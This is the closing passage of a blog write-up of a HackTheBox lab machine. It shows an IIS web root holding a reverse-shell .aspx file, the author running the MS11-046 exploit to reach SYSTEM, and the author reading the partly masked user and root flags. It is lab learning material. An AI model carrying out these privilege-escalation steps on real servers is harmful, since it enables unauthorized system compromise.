<span class="mi">17</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">04</span><span class="p">:</span><span class="mi">37</span>                <span class="mi">689</span> <span class="n">iisstart</span><span class="p">.</span><span class="n">htm</span>
<span class="mi">27</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">07</span><span class="p">:</span><span class="mi">42</span>             <span class="mi">65</span><span class="p">.</span><span class="mi">686</span> <span class="n">MS11</span><span class="o">-</span><span class="mi">046</span><span class="p">.</span><span class="n">exe</span>
<span class="mi">27</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">06</span><span class="p">:</span><span class="mi">50</span>              <span class="mi">2</span><span class="p">.</span><span class="mi">734</span> <span class="n">reverse</span><span class="p">.</span><span class="n">aspx</span>
<span class="mi">27</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">06</span><span class="p">:</span><span class="mi">30</span>                 <span class="mi">14</span> <span class="n">test</span><span class="p">.</span><span class="n">html</span>
<span class="mi">17</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">04</span><span class="p">:</span><span class="mi">37</span>            <span class="mi">184</span><span class="p">.</span><span class="mi">946</span> <span class="n">welcome</span><span class="p">.</span><span class="n">png</span>
               <span class="mi">5</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>        <span class="mi">254</span><span class="p">.</span><span class="mi">069</span> <span class="n">bytes</span>
               <span class="mi">3</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">24</span><span class="p">.</span><span class="mi">604</span><span class="p">.</span><span class="mi">094</span><span class="p">.</span><span class="mi">464</span> <span class="n">bytes</span> <span class="k">free</span>
</pre></div>


<p>Then I run the exploit:</p>
<div class="highlight"><pre><span></span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">wwwroot</span><span class="o">&gt;</span><span class="n">MS11</span><span class="o">-</span><span class="mi">046</span><span class="p">.</span><span class="n">exe</span>
<span class="n">MS11</span><span class="o">-</span><span class="mi">046</span><span class="p">.</span><span class="n">exe</span>

<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="o">&gt;</span><span class="n">whoami</span>
<span class="n">whoami</span>
<span class="n">nt</span> <span class="n">authority</span><span class="err">\</span><span class="k">system</span>
</pre></div>


<p>Now we can easy get the user flag</p>
<div class="highlight"><pre><span></span><span class="c">c:\Users\babis\Desktop&gt;more user.txt.txt                                                                       </span>
<span class="err">more user.txt.txt                 </span>
<span class="err">9e****************************e8 </span>
</pre></div>


<p>and the root flag</p>
<div class="highlight"><pre><span></span><span class="c">c:\Users\Administrator\Desktop&gt;more root.txt.txt</span>
<span class="err">more root.txt.txt</span>
<span class="err">e6****************************4b</span>
</pre></div>
      </div><!-- .entry-content -->
      <br /><br />
      <div class="article_meta">
        Tags:
          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
    </div>
  </div>
</article><!-- #post-## -->
                </div>
              </div><!-- #main -->
          </div><!-- #primary -->
        </div>
      </div><!-- close .row -->
    </div><!-- close .container -->
  </div><!-- close .site-content -->




  <div id="footer-area">
    <footer id="colophon" class="site-footer" role="contentinfo">
      <div class="site-info container">
        <div class="row">
                    <div class="copyright col-md-12">
                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
        </div>
      </div><!-- .site-info -->
      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
    </footer><!-- #colophon -->
  </div>

  <script type="text/javascript">
    window.addEventListener('load', function(){
    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
      window.scroll(0, document.getElementById('main').offsetTop);
    }})
  </script>




</body>
</html>